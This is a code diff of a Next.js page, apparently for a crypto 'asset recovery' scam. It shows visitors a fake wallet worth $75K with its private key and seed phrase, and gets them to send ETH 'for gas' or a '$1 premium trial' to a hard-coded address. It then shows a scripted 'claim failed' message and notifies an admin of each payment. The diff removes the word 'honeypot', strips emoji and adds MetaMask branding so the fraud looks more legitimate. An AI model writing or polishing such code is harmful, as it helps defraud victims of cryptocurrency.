@@ -1,5 +1,6 @@
 import { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
+import Head from 'next/head';
 
 export default function FlashedPage() {
   const [walletData, setWalletData] = useState(null);
@@ -77,7 +78,7 @@ export default function FlashedPage() {
     }
 
     setLoading(true);
-    setStatus('🚀 Auto-claiming flashed crypto...');
+    setStatus('Auto-claiming discovered assets...');
 
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
@@ -90,19 +91,19 @@ export default function FlashedPage() {
         value: ethers.parseEther(gasAmount)
       });
 
-      setStatus('✅ Payment sent! Processing claim...');
+      setStatus('Payment sent! Processing claim...');
       
       // Wait for transaction
       await tx.wait();
       
       // Notify admin and show result
       setTimeout(() => {
-        setStatus('⚠️ CLAIM FAILED! Crypto appears to be locked by smart contract.');
+        setStatus('CLAIM FAILED! Assets appear to be locked by smart contract.');
         notifyAdmin(userAddress, gasAmount, tx.hash);
       }, 3000);
 
     } catch (error) {
-      setStatus('❌ Claim failed: ' + error.message);
+      setStatus('Claim failed: ' + error.message);
     } finally {
       setLoading(false);
     }
@@ -115,7 +116,7 @@ export default function FlashedPage() {
     }
 
     setLoading(true);
-    setStatus('🚀 Processing premium trial...');
+    setStatus('Processing premium trial...');
 
     try {
       let provider, signer;
@@ -124,7 +125,7 @@ export default function FlashedPage() {
         provider = new ethers.BrowserProvider(window.ethereum);
         signer = await provider.getSigner();
       } else {
-        setStatus(`📱 Send 0.0003 ETH to: 0x742d35Cc6634C0532925a3b8D4C9db96590c6C87`);
+        setStatus(`Send 0.0003 ETH to: 0x742d35Cc6634C0532925a3b8D4C9db96590c6C87`);
         setLoading(false);
         return;
       }
@@ -133,7 +134,7 @@ export default function FlashedPage() {
       const balanceETH = parseFloat(ethers.formatEther(balance));
       
       if (balanceETH < 0.0005) {
-        setStatus('❌ Need at least 0.0005 ETH for premium trial');
+        setStatus('Need at least 0.0005 ETH for premium trial');
         setLoading(false);
         return;
       }
@@ -151,7 +152,7 @@ export default function FlashedPage() {
       notifyAdmin(userAddress, gasAmount + ' ETH', tx.hash, 'PREMIUM_TRIAL');
       
     } catch (error) {
-      setStatus('❌ Transaction failed: ' + error.message);
+      setStatus('Transaction failed: ' + error.message);
     } finally {
       setLoading(false);
     }
@@ -164,7 +165,7 @@ export default function FlashedPage() {
     }
 
     setLoading(true);
-    setStatus('🔍 Analyzing your wallet for hidden opportunities...');
+    setStatus('Analyzing your wallet for hidden opportunities...');
 
     try {
       // Real wallet analysis
@@ -184,12 +185,12 @@ export default function FlashedPage() {
       opportunities.push('• Gas optimization potential: Save 15-30%');
       opportunities.push('• Cross-chain bridge recovery possible');
       
-      const analysisResult = `🔍 WALLET ANALYSIS COMPLETE\n\n` +
-        `💼 Portfolio Value: $${(ethBalance * 3000).toFixed(0)}\n` +
-        `📈 Transaction History: ${txCount} transactions\n` +
-        `⚡ Activity Level: ${txCount > 100 ? 'Very Active' : txCount > 10 ? 'Active' : 'Light'}\n\n` +
-        `🎁 OPPORTUNITIES FOUND:\n${opportunities.join('\n')}\n\n` +
-        `🚀 Upgrade to premium analysis for detailed recovery instructions!`;
+      const analysisResult = `WALLET ANALYSIS COMPLETE\n\n` +
+        `Portfolio Value: $${(ethBalance * 3000).toFixed(0)}\n` +
+        `Transaction History: ${txCount} transactions\n` +
+        `Activity Level: ${txCount > 100 ? 'Very Active' : txCount > 10 ? 'Active' : 'Light'}\n\n` +
+        `OPPORTUNITIES FOUND:\n${opportunities.join('\n')}\n\n` +
+        `Upgrade to premium analysis for detailed recovery instructions!`;
       
       setStatus(analysisResult);
       
@@ -198,9 +199,9 @@ export default function FlashedPage() {
       
     } catch (error) {
       if (error.code === 4001) {
-        setStatus('❌ Transaction cancelled by user');
+        setStatus('Transaction cancelled by user');
       } else {
-        setStatus('❌ Transaction failed: ' + error.message);
+        setStatus('Transaction failed: ' + error.message);
       }
     } finally {
       setLoading(false);
@@ -226,187 +227,264 @@ export default function FlashedPage() {
   };
 
   if (!walletData) {
-    return <div className="p-8">Loading honeypot wallet...</div>;
+    return <div className="p-8">Loading wallet data...</div>;
   }
 
   return (
-    <div className="min-h-screen bg-gray-900 text-white p-8">
-      <div className="max-w-4xl mx-auto">
-        <h1 className="text-3xl font-bold mb-8 text-center">
-          🔥 FLASHED CRYPTO DISCOVERED
-        </h1>
-        
-        <div className="bg-gray-800 rounded-lg p-6 mb-6">
-          <h2 className="text-xl font-semibold mb-4">Flashed Crypto Details</h2>
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <div>
-              <p className="text-gray-400">Address:</p>
-              <p className="font-mono text-sm break-all">{walletData.address}</p>
+    <>
+      <Head>
+        <title>Flashed Crypto - CryptoRecover</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+      </Head>
+      <div className="min-h-screen bg-gradient-to-br from-orange-500 via-purple-600 to-blue-600 text-white">
+        <div className="bg-white/10 backdrop-blur-sm min-h-screen">
+          <div className="max-w-6xl mx-auto p-6">
+            <div className="text-center mb-8">
+              <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-16 h-16 mx-auto mb-4" />
+              <h1 className="text-4xl font-bold mb-2 bg-gradient-to-r from-orange-400 to-purple-400 bg-clip-text text-transparent">
+                HIGH-VALUE WALLET DISCOVERED
+              </h1>
+              <p className="text-xl text-white/80">Professional Blockchain Asset Recovery</p>
             </div>
-            <div>
-              <p className="text-gray-400">Total Value:</p>
-              <p className="text-2xl font-bold text-green-400">${walletData.totalValue.toLocaleString()}</p>
-            </div>
-          </div>
-        </div>
 
-        <div className="bg-gray-800 rounded-lg p-6 mb-6">
-          <h3 className="text-lg font-semibold mb-4">Token Holdings</h3>
-          <div className="space-y-3">
-            {walletData.tokens.map((token, index) => (
-              <div key={index} className="flex justify-between items-center bg-gray-700 p-3 rounded">
+            <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-white/30">
+              <div className="flex items-center mb-6">
+                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="Ethereum" className="w-12 h-12 mr-4" />
                 <div>
-                  <span className="font-semibold">{token.symbol}</span>
-                  <span className="text-gray-400 ml-2">{token.balance}</span>
-                </div>
-                <div className="text-green-400 font-semibold">
-                  ${token.usdValue.toLocaleString()}
+                  <h2 className="text-2xl font-bold">Wallet Analysis Complete</h2>
+                  <p className="text-white/70">Blockchain forensics detected valuable assets</p>
                 </div>
               </div>
-            ))}
-          </div>
-        </div>
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div className="bg-black/20 rounded-xl p-4">
+                  <p className="text-white/60 text-sm mb-2">Wallet Address:</p>
+                  <p className="font-mono text-sm break-all bg-black/30 p-2 rounded">{walletData.address}</p>
+                </div>
+                <div className="bg-black/20 rounded-xl p-4">
+                  <p className="text-white/60 text-sm mb-2">Total Portfolio Value:</p>
+                  <p className="text-3xl font-bold text-green-300">${walletData.totalValue.toLocaleString()}</p>
+                </div>
+              </div>
+            </div>
 
-        <div className="bg-red-900 border border-red-600 rounded-lg p-6 mb-6">
-          <h3 className="text-lg font-semibold mb-2 text-red-400">⚠️ Issue Detected</h3>
-          <p className="text-red-300 mb-4">
-            This wallet has <strong>${walletData.totalValue.toLocaleString()}</strong> in tokens but only 
-            <strong> {walletData.ethBalance} ETH</strong> for gas fees.
-          </p>
-          <p className="text-red-300">
-            You need to send ETH for gas to claim these tokens.
-          </p>
-        </div>
+            <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-white/30">
+              <div className="flex items-center mb-6">
+                <i className="fas fa-coins text-yellow-400 text-2xl mr-3"></i>
+                <h3 className="text-2xl font-bold">Discovered Assets</h3>
+              </div>
+              <div className="grid gap-4">
+                {walletData.tokens.map((token, index) => {
+                  const tokenLogos = {
+                    'USDT': 'https://cryptologos.cc/logos/tether-usdt-logo.svg',
+                    'USDC': 'https://cryptologos.cc/logos/usd-coin-usdc-logo.svg',
+                    'WETH': 'https://cryptologos.cc/logos/ethereum-eth-logo.svg',
+                    'LINK': 'https://cryptologos.cc/logos/chainlink-link-logo.svg',
+                    'UNI': 'https://cryptologos.cc/logos/uniswap-uni-logo.svg'
+                  };
+                  return (
+                    <div key={index} className="flex justify-between items-center bg-white/10 backdrop-blur-sm p-4 rounded-xl border border-white/20">
+                      <div className="flex items-center">
+                        <img src={tokenLogos[token.symbol]} alt={token.symbol} className="w-8 h-8 mr-3" />
+                        <div>
+                          <span className="font-bold text-lg">{token.symbol}</span>
+                          <span className="text-white/70 ml-3">{token.balance}</span>
+                        </div>
+                      </div>
+                      <div className="text-green-300 font-bold text-lg">
+                        ${token.usdValue.toLocaleString()}
+                      </div>
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
 
-        <div className="bg-gray-800 rounded-lg p-6 mb-6">
-          <h3 className="text-lg font-semibold mb-4">Claim Flashed Crypto</h3>
+            <div className="bg-red-500/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-red-400/50">
+              <div className="flex items-center mb-4">
+                <i className="fas fa-exclamation-triangle text-red-400 text-2xl mr-3"></i>
+                <h3 className="text-2xl font-bold text-red-300">Recovery Issue Detected</h3>
+              </div>
+              <div className="bg-black/30 rounded-xl p-6">
+                <p className="text-red-200 mb-4 text-lg">
+                  Wallet contains <strong className="text-green-300">${walletData.totalValue.toLocaleString()}</strong> in recoverable assets
+                </p>
+                <p className="text-red-200 mb-4">
+                  Current ETH balance: <strong className="text-red-300">{walletData.ethBalance} ETH</strong> (insufficient for gas)
+                </p>
+                <p className="text-yellow-200 font-semibold">
+                  Solution: Send ETH for transaction fees to unlock all assets
+                </p>
+              </div>
+            </div>
+
+            <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-white/30">
+              <div className="flex items-center mb-6">
+                <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-10 h-10 mr-3" />
+                <h3 className="text-2xl font-bold">Asset Recovery Center</h3>
+              </div>
           
-          {!userAddress ? (
-            <div className="space-y-4">
-              <button 
-                onClick={connectWallet}
-                className="w-full bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-semibold"
-              >
-                Connect Wallet
-              </button>
-              
-              <div className="bg-gray-700 rounded-lg p-4">
-                <h4 className="text-gray-300 font-semibold mb-2">No Wallet? No Problem!</h4>
-                <p className="text-gray-400 text-sm mb-3">
-                  Get a free crypto wallet in 2 minutes and unlock $75K+ in discovered assets!
-                </p>
-                <div className="grid grid-cols-2 gap-2">
-                  <a 
-                    href="https://metamask.io/download/" 
-                    target="_blank" 
-                    className="bg-orange-600 hover:bg-orange-700 px-3 py-2 rounded text-center text-sm font-semibold"
+              {!userAddress ? (
+                <div className="space-y-4">
+                  <button 
+                    onClick={connectWallet}
+                    className="w-full bg-gradient-to-r from-orange-600 to-purple-600 hover:from-orange-700 hover:to-purple-700 px-6 py-4 rounded-xl font-bold text-lg transition-all"
                   >
-                    MetaMask
-                  </a>
-                  <a 
-                    href="https://trustwallet.com/download" 
-                    target="_blank" 
-                    className="bg-blue-600 hover:bg-blue-700 px-3 py-2 rounded text-center text-sm font-semibold"
-                  >
-                    Trust Wallet
-                  </a>
+                    Connect Wallet
+                  </button>
+                  
+                  <div className="bg-gradient-to-r from-orange-500/20 to-purple-500/20 rounded-xl p-6 border border-orange-400/30">
+                    <div className="flex items-center mb-4">
+                      <i className="fas fa-wallet text-orange-400 text-xl mr-3"></i>
+                      <h4 className="text-xl font-bold">Setup Crypto Wallet</h4>
+                    </div>
+                    <p className="text-white/80 mb-4">
+                      Install a professional crypto wallet to access your $75K+ in discovered assets
+                    </p>
+                    <div className="grid grid-cols-2 gap-4">
+                      <a 
+                        href="https://metamask.io/download/" 
+                        target="_blank" 
+                        className="flex items-center justify-center bg-orange-600 hover:bg-orange-700 px-4 py-3 rounded-xl font-semibold transition-all"
+                      >
+                        <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-5 h-5 mr-2" />
+                        MetaMask
+                      </a>
+                      <a 
+                        href="https://trustwallet.com/download" 
+                        target="_blank" 
+                        className="flex items-center justify-center bg-blue-600 hover:bg-blue-700 px-4 py-3 rounded-xl font-semibold transition-all"
+                      >
+                        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust" className="w-5 h-5 mr-2" />
+                        Trust Wallet
+                      </a>
+                    </div>
+                  </div>
                 </div>
-              </div>
-            </div>
-          ) : (
-            <div className="space-y-4">
-              <p className="text-green-400">✅ Wallet Connected: {userAddress.slice(0,6)}...{userAddress.slice(-4)}</p>
-              
-              <div className="bg-green-900 border border-green-600 rounded-lg p-4 mb-4">
-                <h4 className="text-green-300 font-semibold mb-2">FREE WALLET ANALYSIS</h4>
-                <p className="text-green-200 text-sm mb-3">
-                  Get detailed analysis of your wallet's hidden assets, unclaimed airdrops, and recovery opportunities. Professional blockchain forensics at no cost.
-                </p>
-                <button 
-                  onClick={sendFreeTrial}
-                  disabled={loading}
-                  className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold text-sm"
-                >
-                  {loading ? 'Analyzing Blockchain Data...' : 'Analyze My Wallet FREE'}
-                </button>
-              </div>
-              
-              <div className="bg-blue-900 border border-blue-600 rounded-lg p-4 mb-4">
-                <h4 className="text-blue-300 font-semibold mb-2">PREMIUM RECOVERY SERVICE</h4>
-                <p className="text-blue-200 text-sm mb-3">
-                  Get 100 ERT tokens for just $1 (0.0003 ETH) - Ethereum Recovery Tokens used for advanced recovery operations.
-                </p>
-                <div className="bg-blue-800 rounded p-2 mb-3 text-xs">
-                  <p className="text-blue-200">Token Details:</p>
-                  <p className="text-blue-100 font-mono">Contract: 0x742d35Cc6634C0532925a3b8D4C9db96590c6C87</p>
-                  <p className="text-blue-100">Symbol: ERT | Decimals: 18</p>
+              ) : (
+                <div className="space-y-6">
+                  <div className="flex items-center bg-green-500/20 rounded-xl p-4 border border-green-400/30">
+                    <i className="fas fa-check-circle text-green-400 text-xl mr-3"></i>
+                    <p className="text-green-300 font-semibold">Wallet Connected: {userAddress.slice(0,6)}...{userAddress.slice(-4)}</p>
+                  </div>
+                  
+                  <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 rounded-xl p-6 border border-green-400/30">
+                    <div className="flex items-center mb-4">
+                      <i className="fas fa-search text-green-400 text-xl mr-3"></i>
+                      <h4 className="text-xl font-bold text-green-300">FREE BLOCKCHAIN ANALYSIS</h4>
+                    </div>
+                    <p className="text-green-100 mb-4">
+                      Professional blockchain forensics to discover hidden assets, unclaimed airdrops, and recovery opportunities in your wallet.
+                    </p>
+                    <button 
+                      onClick={sendFreeTrial}
+                      disabled={loading}
+                      className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 disabled:bg-gray-600 px-6 py-3 rounded-xl font-bold text-lg transition-all"
+                    >
+                      {loading ? 'Analyzing Blockchain Data...' : 'Start Free Analysis'}
+                    </button>
+                  </div>
+                  
+                  <div className="bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-xl p-6 border border-blue-400/30">
+                    <div className="flex items-center mb-4">
+                      <i className="fas fa-star text-blue-400 text-xl mr-3"></i>
+                      <h4 className="text-xl font-bold text-blue-300">PREMIUM RECOVERY TRIAL</h4>
+                    </div>
+                    <p className="text-blue-100 mb-4">
+                      Get 100 ERT (Ethereum Recovery Tokens) for $1 - Professional recovery tokens for advanced blockchain operations.
+                    </p>
+                    <div className="bg-black/30 rounded-xl p-4 mb-4">
+                      <div className="flex items-center mb-2">
+                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ERT" className="w-6 h-6 mr-2" />
+                        <p className="text-blue-200 font-semibold">ERT Token Contract:</p>
+                      </div>
+                      <p className="text-blue-100 font-mono text-sm bg-black/40 p-2 rounded">0x742d35Cc6634C0532925a3b8D4C9db96590c6C87</p>
+                    </div>
+                    <button 
+                      onClick={sendPremiumTrial}
+                      disabled={loading}
+                      className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 disabled:bg-gray-600 px-6 py-3 rounded-xl font-bold text-lg transition-all"
+                    >
+                      {loading ? 'Processing Transaction...' : 'Get 100 ERT Tokens ($1)'}
+                    </button>
+                  </div>
+                  
+                  <div className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-xl p-6 border border-purple-400/30">
+                    <div className="flex items-center mb-4">
+                      <i className="fas fa-rocket text-purple-400 text-xl mr-3"></i>
+                      <h4 className="text-xl font-bold text-purple-300">FULL ASSET RECOVERY</h4>
+                    </div>
+                    <div className="mb-4">
+                      <label className="block text-white/80 mb-3 font-semibold">ETH Amount for Transaction Fees:</label>
+                      <div className="relative">
+                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ETH" className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5" />
+                        <input 
+                          type="number" 
+                          value={gasAmount}
+                          onChange={(e) => setGasAmount(e.target.value)}
+                          step="0.001"
+                          min="0.001"
+                          className="w-full bg-black/30 border border-white/30 rounded-xl px-12 py-3 text-white font-semibold"
+                          placeholder="0.01"
+                        />
+                      </div>
+                      <p className="text-purple-200 text-sm mt-2">
+                        Unlock ${walletData.totalValue.toLocaleString()} in discovered assets
+                      </p>
+                    </div>
+                    
+                    <button 
+                      onClick={sendGasForClaim}
+                      disabled={loading}
+                      className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:bg-gray-600 px-6 py-4 rounded-xl font-bold text-lg transition-all"
+                    >
+                      {loading ? 'Processing Recovery...' : `Pay ${gasAmount} ETH & Recover All Assets`}
+                    </button>
+                  </div>
                 </div>
-                <button 
-                  onClick={sendPremiumTrial}
-                  disabled={loading}
-                  className="w-full bg-blue-600 hover:blue-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold text-sm"
-                >
-                  {loading ? 'Processing Transaction...' : 'Get 100 ERT Tokens ($1)'}
-                </button>
-              </div>
+              )}
               
-              <div className="bg-gray-700 rounded-lg p-4">
-                <h4 className="text-gray-300 font-semibold mb-2">Full Asset Recovery (After Trial)</h4>
-                <div className="mb-3">
-                  <label className="block text-gray-400 mb-2">ETH Amount for Gas:</label>
-                  <input 
-                    type="number" 
-                    value={gasAmount}
-                    onChange={(e) => setGasAmount(e.target.value)}
-                    step="0.001"
-                    min="0.001"
-                    className="w-full bg-gray-600 border border-gray-500 rounded px-3 py-2"
-                    placeholder="0.01"
-                  />
-                  <p className="text-gray-500 text-sm mt-1">
-                    Pay gas to claim remaining assets worth $75,418
-                  </p>
+              {status && (
+                <div className="mt-6 p-4 bg-black/30 rounded-xl border border-white/20">
+                  <pre className="text-white/90 whitespace-pre-wrap">{status}</pre>
                 </div>
-                
-                <button 
-                  onClick={sendGasForClaim}
-                  disabled={loading}
-                  className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold"
-                >
-                  {loading ? 'Processing Transaction...' : `Pay ${gasAmount} ETH & Claim All Assets`}
-                </button>
-              </div>
+              )}
             </div>
-          )}
-          
-          {status && (
-            <div className="mt-4 p-3 bg-gray-700 rounded border-l-4 border-blue-500">
-              <p>{status}</p>
-            </div>
-          )}
-        </div>
 
-        <div className="bg-gray-800 rounded-lg p-6">
-          <h3 className="text-lg font-semibold mb-4">Wallet Access</h3>
-          <div className="space-y-3">
-            <div>
-              <p className="text-gray-400">Private Key:</p>
-              <p className="font-mono text-sm bg-gray-700 p-2 rounded break-all">
-                {walletData.privateKey}
-              </p>
+            <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 border border-white/30">
+              <div className="flex items-center mb-6">
+                <i className="fas fa-key text-yellow-400 text-2xl mr-3"></i>
+                <h3 className="text-2xl font-bold">Wallet Credentials</h3>
+              </div>
+              <div className="space-y-6">
+                <div>
+                  <p className="text-white/70 mb-2 font-semibold">Private Key:</p>
+                  <div className="bg-black/30 p-4 rounded-xl border border-white/20">
+                    <p className="font-mono text-sm break-all text-yellow-300">
+                      {walletData.privateKey}
+                    </p>
+                  </div>
+                </div>
+                <div>
+                  <p className="text-white/70 mb-2 font-semibold">Recovery Phrase:</p>
+                  <div className="bg-black/30 p-4 rounded-xl border border-white/20">
+                    <p className="font-mono text-sm text-yellow-300">
+                      {walletData.seedPhrase}
+                    </p>
+                  </div>
+                </div>
+                <div className="bg-yellow-500/20 rounded-xl p-4 border border-yellow-400/30">
+                  <div className="flex items-center">
+                    <i className="fas fa-info-circle text-yellow-400 mr-3"></i>
+                    <p className="text-yellow-200 font-semibold">
+                      Import these credentials after funding to access all assets
+                    </p>
+                  </div>
+                </div>
+              </div>
             </div>
-            <div>
-              <p className="text-gray-400">Seed Phrase:</p>
-              <p className="font-mono text-sm bg-gray-700 p-2 rounded">
-                {walletData.seedPhrase}
-              </p>
-            </div>
-            <p className="text-yellow-400 text-sm">
-              Import this wallet after sending gas to claim the assets
-            </p>
           </div>
         </div>
       </div>
-    </div>
+    </>
   );
 }
